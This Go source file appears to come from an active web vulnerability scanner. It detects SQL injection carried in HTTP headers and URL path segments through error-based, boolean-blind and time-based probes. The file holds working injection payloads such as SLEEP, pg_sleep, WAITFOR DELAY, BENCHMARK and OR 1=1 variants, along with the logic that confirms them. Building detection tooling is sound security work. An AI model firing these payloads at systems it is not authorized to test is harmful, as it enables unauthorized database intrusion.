package active

import (
	"context"
	"errors"
	"sort"
	"strconv"
	"strings"
	"time"

	"github.com/guaidao2/crackweb/internal/checks"
	"github.com/guaidao2/crackweb/internal/diff"
	"github.com/guaidao2/crackweb/internal/finding"
	"github.com/guaidao2/crackweb/internal/httpmsg"
	"github.com/guaidao2/crackweb/internal/i18n"
)

// This file holds the SQL injection that does not go through a parameter at all: a value the
// caller writes into a header the application records, and a value it writes into the segment a
// route addresses a resource by. Both reach a query the parameter checks cannot see.
//
// The error-based probe comes first, because a complaint from the database costs one request and
// settles the question. The blind channels — a page that tracks a condition, a request that takes
// measurably longer — are asked afterwards, and only where the parameter walk found nothing; they
// are the only way to see the same flaw on an application that answers normally either way.

// sqlErrorHeaderInjection looks for the error-based injection that does not go through a
// parameter at all.
//
// An application that records a visitor — the address in `X-Forwarded-For`, the agent string,
// the referring page — has a query built from a header, and a header is a value the caller
// writes freely. None of the parameter checks can reach it: there is no parameter. The
// payloads are the plain ones, because the point is to break the syntax and read the database's
// own complaint, and a complaint that was not in the baseline is evidence.
//
// The first request carries the payload in every candidate header at once, so the common case —
// a target that builds no query from a header — costs one request rather than one per header.
// When that request does produce a new error, the headers are tried one at a time to say which
// one it was, because "some header" is not a finding a reader can act on.
var sqliHeaderNames = []string{
	"X-Forwarded-For",
	"X-Real-IP",
	"X-Client-IP",
	"User-Agent",
	"Referer",
}

// sqliHeaderPayloads break a quoted string and leave the rest of the statement intact, which is
// what produces the database's own error rather than a refusal.
var sqliHeaderPayloads = []string{"'", "')-- -", "' AND 1=CONVERT(int, @@version)-- -"}

func sqlErrorHeaderInjection(ctx context.Context, c *checks.Context, t *checks.Target,
	baselineLower string) *finding.Finding {
	for _, payloadText := range sqliHeaderPayloads {
		request := withHeaderPayload(t.Request, sqliHeaderNames, payloadText)
		response, err := c.Do(ctx, request)
		if err != nil || response == nil || response.Status >= 400 {
			continue
		}
		matched := firstNewSignature(strings.ToLower(string(response.Body)), baselineLower, sqlErrorSignatures)
		if matched == "" {
			continue
		}

		// Which header it was, asked one at a time. Only reached once the answer is already
		// known to change, so the cost is paid for a finding rather than for every target.
		culprit, located := "", withHeaderPayload(t.Request, sqliHeaderNames[:1], payloadText)
		var locatedResponse *httpmsg.Response
		for _, name := range sqliHeaderNames {
			one := withHeaderPayload(t.Request, []string{name}, payloadText)
			resp, err := c.Do(ctx, one)
			if err != nil || resp == nil {
				continue
			}
			if firstNewSignature(strings.ToLower(string(resp.Body)), baselineLower, sqlErrorSignatures) != "" {
				culprit, located, locatedResponse = name, one, resp
				break
			}
		}
		if culprit == "" {
			// The error followed the combined request but not any single header: the target
			// reacted to the set rather than to one of them, which is not an injection to name.
			continue
		}
		if locatedResponse != nil {
			response = locatedResponse
		}

		f := checks.NewFinding(sqliError{}, t,
			i18n.KeyCheckSQLiErrorTitle, i18n.KeyCheckSQLiErrorDesc, i18n.KeyCheckSQLiErrorFix)
		f.Severity = finding.SeverityCritical
		f.Confidence = finding.ConfidenceCertain
		f.Method = request.Method
		f.Payload = culprit + ": " + payloadText
		f.CWE = "CWE-89"
		f.References = sqlReferences
		f.Evidence.Request = located.Raw()
		f.Evidence.Response = truncate(response.Body, 4096)
		f.Evidence.Baseline = truncate(t.Response.Body, 2048)
		f.Evidence.Matches = []string{
			"the database reported an error that was not in the baseline: " + matched,
			"the request that produced it carried the payload in the " + culprit + " header, and " +
				"nothing else changed",
			"the query is built from a header, which the caller writes freely and no parameter " +
				"of this endpoint reaches",
		}
		f.Evidence.Diff = extractAround(string(response.Body), matched, 240)
		return f
	}
	return nil
}

// withHeaderPayload returns a copy of the request with the payload value in each of the named
// headers. The rest of the request — method, body, parameters — is left exactly as it was, so
// the difference the response shows is the header and nothing else.
func withHeaderPayload(request *httpmsg.Request, names []string, value string) *httpmsg.Request {
	out := request.Clone()
	for _, name := range names {
		out.Header.Set(name, value)
	}
	return out
}

// sqliPathPayloads break a quoted string as it would sit in a path segment.
var sqliPathPayloads = []string{"'", "')-- -", "' AND 1=CONVERT(int, @@version)-- -"}

// sqlErrorPathInjection tries the payload as a path segment, which is the third place a value
// can enter a query and the one no parameter reaches.
//
// A route that reads `/user/<name>` has a value the caller writes just as freely as a query
// parameter, and frameworks make it the ordinary way to address a resource. The segment is
// tried both ways round — in place of the last one and appended after it — because a route may
// take the value as the last segment or leave room for one after it.
//
// A segment that simply does not exist is not evidence of anything: the page for a missing
// resource is served with the same status and contains no error, which is why this is worth
// doing with the error-based judgement rather than by comparing bodies. Reached only when no
// parameter and no header produced a complaint, so a target that answers through either pays
// nothing for it.
func sqlErrorPathInjection(ctx context.Context, c *checks.Context, t *checks.Target,
	baselineLower string) *finding.Finding {
	for _, payloadText := range sqliPathPayloads {
		for _, inPlace := range []bool{true, false} {
			request, ok := withPathPayload(t.Request, payloadText, inPlace)
			if !ok {
				continue
			}
			response, err := c.Do(ctx, request)
			if err != nil || response == nil || response.Status >= 400 {
				continue
			}
			matched := firstNewSignature(strings.ToLower(string(response.Body)), baselineLower, sqlErrorSignatures)
			if matched == "" {
				continue
			}

			where := "appended to the path"
			if inPlace {
				where = "in place of the last path segment"
			}
			f := checks.NewFinding(sqliError{}, t,
				i18n.KeyCheckSQLiErrorTitle, i18n.KeyCheckSQLiErrorDesc, i18n.KeyCheckSQLiErrorFix)
			f.Severity = finding.SeverityCritical
			f.Confidence = finding.ConfidenceCertain
			f.Method = request.Method
			f.Payload = payloadText + " (" + where + ")"
			f.CWE = "CWE-89"
			f.References = sqlReferences
			f.Evidence.Request = request.Raw()
			f.Evidence.Response = truncate(response.Body, 4096)
			f.Evidence.Baseline = truncate(t.Response.Body, 2048)
			f.Evidence.Matches = []string{
				"the database reported an error that was not in the baseline: " + matched,
				"the request that produced it carried the payload as part of the path, with no " +
					"parameter changed",
				"the route reads the value from the path, where the caller writes it just as " +
					"freely as a query parameter",
			}
			f.Evidence.Diff = extractAround(string(response.Body), matched, 240)
			return f
		}
	}
	return nil
}

// withPathPayload returns a copy of the request with the payload added to its path: in place of
// the last segment when inPlace is set, and appended after it otherwise. RawPath is cleared
// because the Go URL keeps the escaped form alongside the decoded one, and a stale one would be
// sent instead of what is built here.
func withPathPayload(request *httpmsg.Request, payloadText string, inPlace bool) (*httpmsg.Request, bool) {
	if request.URL == nil || request.URL.Path == "" || request.URL.Path == "/" {
		return nil, false
	}
	out := request.Clone()
	address := *request.URL
	segments := strings.Split(strings.TrimSuffix(address.Path, "/"), "/")
	// The payload goes in as it stands: the URL escapes Path when the request is written, and
	// escaping it here as well would put the escapes themselves on the wire.
	if inPlace && len(segments) > 1 {
		segments[len(segments)-1] = payloadText
	} else {
		segments = append(segments, payloadText)
	}
	address.Path = strings.Join(segments, "/")
	address.RawPath = ""
	out.URL = &address
	return out, true
}

// ---------------------------------------------------------------------------------------------
// Blind injection through the same places
//
// A blind injection is the one the response does not spell out: no message from the database, and
// nothing in the page a reader would notice. What it leaves behind is a channel — a page that
// answers two equivalent conditions differently, or a request that takes measurably longer — and
// reading a channel needs no parameter at all.
//
// Both blind checks therefore work in two stages at each place:
//
//  1. A screen, which is the cheapest question that can rule the place out. For the boolean
//     channel it is the first condition of each group: a family whose true and false branches
//     answer identically cannot become a finding however the rest of it is spelled, so the second
//     spelling is not worth sending. For the delay channel it is one request per spelling, given a
//     deadline wide enough for the pause it asked for.
//  2. The judgement the parameter walk uses, unchanged — the family walk for the boolean channel,
//     repeated measurement against a control for the delay. Nothing is relaxed because the value
//     arrived somewhere other than a parameter.
//
// A place that answers nothing is left alone, which is what keeps five headers and a path from
// multiplying the check's traffic on the ordinary target that builds no query from either.

// blindSite is a place a value can reach a query from other than a parameter.
type blindSite struct {
	// label names the place for a reader: `the X-Forwarded-For header`, `the path`.
	label string
	// header is the field the payload was written into, or "" when the place is the path. The
	// combined screen writes into every candidate header at once and so names none of them.
	header string
	// original is the value the place held before anything was written there. It is what the
	// payload is appended to and what a reflected payload is restored to — the same two jobs
	// t.Param.Value does for the parameter walk.
	original string
	// write returns a copy of the request carrying value in this place.
	write func(value string) (*httpmsg.Request, bool)
}

// errBlindUnwritable reports a place a value cannot be written into, such as a request with no
// path. There was nothing to ask, which is neither a finding nor a failure.
var errBlindUnwritable = errors.New("active: the payload cannot be written into this place")

// prefix is the value the payload extends.
//
// A place that held nothing has no value to extend, so the payload starts from the neutral one the
// parameter walk uses for an empty parameter: a condition appended to `1` is well formed in either
// quoting context, where a condition appended to nothing is a syntax error before the condition is
// ever reached.
func (s blindSite) prefix() string {
	if strings.TrimSpace(s.original) == "" {
		return "1"
	}
	return s.original
}

// payload names the injection for a reader, in the form the evidence request carries it.
func (s blindSite) payload(value string) string {
	if s.header != "" {
		// `Name: value` is how the field appears in the raw request the evidence records, so the
		// payload a reader is given is one they can find in it.
		return s.header + ": " + value
	}
	return value + " (in place of the last path segment)"
}

// send writes value into the place and sends the request.
//
// The deadline belongs to the request rather than to the client, because a delay probe asks the
// server to wait longer than an ordinary request is given and the client's deadline cannot be
// widened for a single exchange.
func (s blindSite) send(ctx context.Context, c *checks.Context, value string,
	timeout time.Duration) (*httpmsg.Request, *httpmsg.Response, error) {
	request, ok := s.write(value)
	if !ok || request == nil {
		return nil, nil, errBlindUnwritable
	}
	if timeout > 0 {
		request.Timeout = timeout
	}
	response, err := c.Do(ctx, request)
	return request, response, err
}

// blindHeaderScreen is the place that writes one value into every candidate header at once.
//
// The common target builds no query from any header, and asking it five times to find that out
// costs five times as much as asking once. The combined place is asked first, and only a place
// that answers is split.
//
// Its restore list maps the payload to nothing rather than to a header's own value, because the
// headers it writes at once hold different values and one pattern can only be restored to one of
// them. That makes the combined place slightly stricter than the walk behind it on a page that
// reflects a header it was given — and it is only a screen: every finding comes from a request
// that carries the payload in a single header, where the restore is exact.
func blindHeaderScreen(t *checks.Target) blindSite {
	return blindSite{
		label: "the candidate headers",
		write: func(value string) (*httpmsg.Request, bool) {
			return withHeaderPayload(t.Request, sqliHeaderNames, value), true
		},
	}
}

// blindHeaderSites returns one place per candidate header, which is how the header that did it is
// named: "some header" is not something a reader can act on.
func blindHeaderSites(t *checks.Target) []blindSite {
	sites := make([]blindSite, 0, len(sqliHeaderNames))
	for _, name := range sqliHeaderNames {
		sites = append(sites, blindSite{
			label:    "the " + name + " header",
			header:   name,
			original: t.Request.Header.Get(name),
			write: func(value string) (*httpmsg.Request, bool) {
				return withHeaderPayload(t.Request, []string{name}, value), true
			},
		})
	}
	return sites
}

// blindPathSite returns the place a route reads its resource from: the segment the request already
// addresses.
//
// The payload is written into that segment rather than after it. A route reads the value in the
// position it was addressed by, and a value appended after it names a different resource — which
// is a request the error-based probe can afford to spend and a walk over every family cannot.
func blindPathSite(t *checks.Target) (blindSite, bool) {
	segment := pathSegment(t.Request)
	if segment == "" {
		return blindSite{}, false
	}
	return blindSite{
		label:    "the path",
		original: segment,
		write: func(value string) (*httpmsg.Request, bool) {
			return withPathPayload(t.Request, value, true)
		},
	}, true
}

// blindFamilies are the families a place other than a parameter is walked with.
//
// The two transport-form wide-byte families are replaced rather than reused. Their values are
// spelled for a query parameter — percent escapes that the application decodes back into bytes —
// and a header carries the byte itself, while a path is escaped by the URL and decoded again
// before the application sees it. Written as the byte, one pair serves both places.
func blindFamilies() []booleanFamily {
	families := make([]booleanFamily, 0, len(booleanFamilies)+len(booleanMutatedFamilies())+1)
	for _, family := range booleanFamilies {
		if family.encoded {
			continue
		}
		families = append(families, family)
	}
	families = append(families, booleanFamily{
		name:        "OR, wide byte",
		trueValues:  []string{"\xdf' OR 1=1-- -", "\xdf' OR 2=2-- -"},
		falseValues: []string{"\xdf' OR 1=2-- -", "\xdf' OR 3=4-- -"},
	})
	return append(families, booleanMutatedFamilies()...)
}

// blindBooleanAt runs the boolean family walk at one place.
//
// The screen and the walk are the same requests. A family is entered with the pair that decides
// whether it is worth finishing, so a place that answers nothing costs two requests per family and
// nothing is skipped that the walk could have used — which is the property that makes it safe to
// ask a question this expensive five times and then once more for the path.
func blindBooleanAt(ctx context.Context, c *checks.Context, t *checks.Target,
	site blindSite) (booleanVerdict, bool) {
	// baseUnder fingerprints the baseline the way a branch is fingerprinted: with the payload
	// restored to what the place held before. Applying the restore to one side of a comparison
	// only is what turns page text the application wrote for its own reasons into a difference.
	baseUnder := func(value string) *diff.Fingerprint {
		return c.Fingerprint(t.Response, echoRestore(value, site.original)...)
	}
	probe := func(_ booleanFamily, suffix string) (booleanBranch, *httpmsg.Request, bool) {
		value := site.prefix() + suffix
		request, response, err := site.send(ctx, c, value, 0)
		if err != nil || request == nil || response == nil || response.Status >= 400 {
			// A branch that failed is not a branch that was answered.
			return booleanBranch{}, nil, false
		}
		fp := c.Fingerprint(response, echoRestore(value, site.original)...)
		return booleanBranch{value: value, response: response, fp: fp}, request, true
	}
	return walkBooleanFamilies(blindFamilies(), baseUnder, probe)
}

// blindBooleanFinding asks the places a parameter check cannot reach.
//
// The headers are asked together first and one at a time only when the combined place answered, so
// the common target — one that builds no query from a header — pays for the question once. The
// path is asked last, because a route that reads a query parameter and a query built from a header
// are both more common than a route that reads its own segment into a statement.
// blindSiteParam names the place a blind finding was carried in. NewFinding derives Param from
// t.Param, which is a query parameter even when the payload never touched it; using that value
// would print "query:q" for a header and make the same header injection deduplicate per parameter.
func blindSiteParam(site blindSite) string {
	if site.header != "" {
		return "header:" + site.header
	}
	return "path"
}

// blindBooleanFindingResult builds the finding and names the blind place, rather than inheriting
// the query parameter NewFinding would otherwise print and deduplicate on.
func blindBooleanFindingResult(c *checks.Context, t *checks.Target, verdict booleanVerdict,
	site blindSite) *finding.Finding {
	note := "the payload was written into the path, with no parameter changed: the route " +
		"reads the value it was addressed by, where the caller writes it just as freely as a " +
		"query parameter"
	if site.header != "" {
		note = "the payload was carried in the " + site.header + " header, with no parameter " +
			"changed: the query is built from a header, which the caller writes freely and no " +
			"parameter of this endpoint reaches"
	}
	f := booleanFinding(c, t, verdict, site.payload(verdict.falseOne.value), note)
	if f != nil {
		f.Param = blindSiteParam(site)
	}
	return f
}

func blindBooleanFinding(ctx context.Context, c *checks.Context, t *checks.Target) *finding.Finding {
	if _, answered := blindBooleanAt(ctx, c, t, blindHeaderScreen(t)); answered {
		// Some header did it, and which one is the next question: a finding that names a set of
		// headers is not one a reader can fix.
		for _, site := range blindHeaderSites(t) {
			verdict, found := blindBooleanAt(ctx, c, t, site)
			if !found {
				continue
			}
			return blindBooleanFindingResult(c, t, verdict, site)
		}
	}
	if site, ok := blindPathSite(t); ok {
		if verdict, found := blindBooleanAt(ctx, c, t, site); found {
			return blindBooleanFindingResult(c, t, verdict, site)
		}
	}
	return nil
}

// blindPauseToken marks where the pause in seconds goes in a delay spelling, so that the
// instruction, the deadline it is given and the delay the verdict expects all come from one
// number rather than from three that can drift apart.
const blindPauseToken = "{pause}"

// blindDelay is one delay instruction and the pause it asks the server for.
type blindDelay struct {
	// payload is the instruction, with blindPauseToken where the seconds go.
	payload string
	// pause is what the instruction asks the server to wait.
	pause time.Duration
}

// blindDelaySpellings are the delay instructions for a value whose quoting context is not known.
//
// Both contexts are present because which one is usable depends on where the value lands:
// `WHERE ip = '…'` puts it in a quoted string, `WHERE id = …` in a numeric position, and a quote
// in the second is a syntax error the database answers instantly. That is the mistake that once
// left a numeric parameter invisible to the time-based check, and nothing about a header or a path
// segment makes it less likely.
var blindDelaySpellings = []blindDelay{
	{"' AND SLEEP(" + blindPauseToken + ")-- -", 5 * time.Second},
	{" AND SLEEP(" + blindPauseToken + ")-- -", 5 * time.Second},
	// The same pause nested inside the condition, which needs no statement separator and no
	// comment terminator to close the string the value was put in.
	{"' AND (SELECT 1 FROM (SELECT SLEEP(" + blindPauseToken + "))x)-- -", 5 * time.Second},
	{"' AND pg_sleep(" + blindPauseToken + ")-- -", 5 * time.Second},
	{" AND pg_sleep(" + blindPauseToken + ")-- -", 5 * time.Second},
	// SQL Server, where the pause is a statement of its own.
	{"' AND (SELECT 1)>0 WAITFOR DELAY '0:0:" + blindPauseToken + "'--", 5 * time.Second},
	// MySQL's other way to burn time, for the target that blocks the word SLEEP: an ordinary
	// expression that costs the database twenty million hashes rather than a delay primitive.
	{"' AND BENCHMARK(20000000,MD5(1))-- -", 5 * time.Second},
}

// value is the instruction, with the pause written in, in front of the value the place holds.
func (d blindDelay) value(prefix string) string {
	seconds := strconv.Itoa(int(d.pause / time.Second))
	return prefix + strings.ReplaceAll(d.payload, blindPauseToken, seconds)
}

// blindTimingHints reports whether any spelling made this place take noticeably longer than it
// should have.
//
// It is deliberately permissive — a quarter of the pause is enough to justify the requests a real
// measurement costs — because its job is to avoid work, not to decide. The verdict comes from
// JudgeTiming, which is strict.
func blindTimingHints(ctx context.Context, c *checks.Context, site blindSite,
	spellings []blindDelay) bool {
	for _, spelling := range spellings {
		_, response, err := site.send(ctx, c, spelling.value(site.prefix()),
			timingBudget(spelling.pause))
		if err != nil || response == nil || response.Status >= 400 {
			continue
		}
		if response.Duration >= spelling.pause/4 {
			return true
		}
	}
	return false
}

// blindTimingAt asks one place whether a delay instruction is honoured, and returns the finding
// that establishes it.
func blindTimingAt(ctx context.Context, c *checks.Context, t *checks.Target, site blindSite,
	spellings []blindDelay) *finding.Finding {
	for _, spelling := range spellings {
		pause := spelling.pause
		value := spelling.value(site.prefix())
		budget := timingBudget(pause)

		// The cheap question first: one request, given the deadline a pause of this length
		// needs. Noise is the real verdict's problem, not the screen's.
		request, response, err := site.send(ctx, c, value, budget)
		if err != nil || request == nil || response == nil {
			continue
		}
		if response.Status >= 400 || response.Duration < pause/4 {
			continue
		}

		// Measure both sides the same way, then decide. The control is the request as it stands
		// — the same request with nothing written into the place — so the difference the verdict
		// reads is the payload's and nothing else.
		control, err := blindTimingSamples(ctx, c, blindControl(t), "", checks.DefaultTimingSamples, budget)
		if err != nil {
			continue
		}
		injected, err := blindTimingSamples(ctx, c, site, value, checks.DefaultTimingSamples, budget)
		if err != nil {
			continue
		}
		verdict := checks.JudgeTiming(control, injected, pause)
		if !verdict.Delayed {
			continue
		}

		f := checks.NewFinding(sqliTime{}, t,
			i18n.KeyCheckSQLiTimeTitle, i18n.KeyCheckSQLiTimeDesc, i18n.KeyCheckSQLiTimeFix)
		f.Param = blindSiteParam(site)
		f.Severity = finding.SeverityHigh
		f.Confidence = finding.ConfidenceFirm
		f.Payload = site.payload(value)
		f.CWE = "CWE-89"
		f.References = sqlReferences
		f.Evidence.Request = request.Raw()
		f.Evidence.Response = truncate(response.Body, 4096)
		f.Evidence.Baseline = truncate(t.Response.Body, 4096)
		f.Evidence.Duration = verdict.Injected.Median
		f.Evidence.Matches = []string{
			c.Bundle.T(i18n.KeyEvidenceTimingStat,
				len(injected.Samples), ms(verdict.Injected.Median), ms(control.Median),
				ms(verdict.Injected.IQR),
				"the payload was carried in "+site.label+", with no parameter changed, and the "+
					"same request without it was measured the same way"),
		}
		return f
	}
	return nil
}

// blindTimingFinding asks the places a parameter check cannot reach, in the same order the boolean
// channel does: every header at once, then one at a time, then the path.
func blindTimingFinding(ctx context.Context, c *checks.Context, t *checks.Target,
	spellings []blindDelay) *finding.Finding {
	if blindTimingHints(ctx, c, blindHeaderScreen(t), spellings) {
		for _, site := range blindHeaderSites(t) {
			if f := blindTimingAt(ctx, c, t, site, spellings); f != nil {
				return f
			}
		}
	}
	if site, ok := blindPathSite(t); ok {
		if f := blindTimingAt(ctx, c, t, site, spellings); f != nil {
			return f
		}
	}
	return nil
}

// blindControl is the place as it stands: the request with nothing written into it, which is what
// an injected measurement is compared against.
func blindControl(t *checks.Target) blindSite {
	return blindSite{
		label: "the request as it stands",
		write: func(string) (*httpmsg.Request, bool) {
			return t.Request.Clone(), true
		},
	}
}

// blindTimingSamples sends one request repeatedly and summarises how long it took.
//
// The summary is computed here rather than borrowed because the measurement is of a request rather
// than of a parameter value: checks.MeasureTiming takes a target and a parameter, and the value
// under test is not in a parameter at all. The statistics are the ones JudgeTiming expects — the
// median and the spread of the middle half — and it is JudgeTiming that decides.
func blindTimingSamples(ctx context.Context, c *checks.Context, site blindSite, value string,
	samples int, budget time.Duration) (checks.TimingSample, error) {
	if samples < 1 {
		samples = 1
	}
	durations := make([]time.Duration, 0, samples)
	for i := 0; i < samples; i++ {
		if err := ctx.Err(); err != nil {
			break
		}
		_, response, err := site.send(ctx, c, value, budget)
		if err != nil || response == nil {
			continue
		}
		durations = append(durations, response.Duration)
	}
	if len(durations) == 0 {
		return checks.TimingSample{}, errors.New("active: the target did not answer the measurement")
	}
	return summariseDurations(durations), nil
}

// summariseDurations computes the robust statistics of a set of measurements.
func summariseDurations(durations []time.Duration) checks.TimingSample {
	sorted := append([]time.Duration(nil), durations...)
	sort.Slice(sorted, func(i, j int) bool { return sorted[i] < sorted[j] })
	return checks.TimingSample{
		Samples: sorted,
		Median:  durationQuantile(sorted, 0.50),
		IQR:     durationQuantile(sorted, 0.75) - durationQuantile(sorted, 0.25),
		Min:     sorted[0],
		Max:     sorted[len(sorted)-1],
	}
}

// durationQuantile returns the value at a fraction of the sorted sample, interpolating between
// neighbours the way the parameter probes' measurements do.
func durationQuantile(sorted []time.Duration, fraction float64) time.Duration {
	if len(sorted) == 0 {
		return 0
	}
	if len(sorted) == 1 {
		return sorted[0]
	}
	position := fraction * float64(len(sorted)-1)
	lower := int(position)
	upper := lower + 1
	if upper >= len(sorted) {
		return sorted[len(sorted)-1]
	}
	weight := position - float64(lower)
	return time.Duration(float64(sorted[lower])*(1-weight) + float64(sorted[upper])*weight)
}
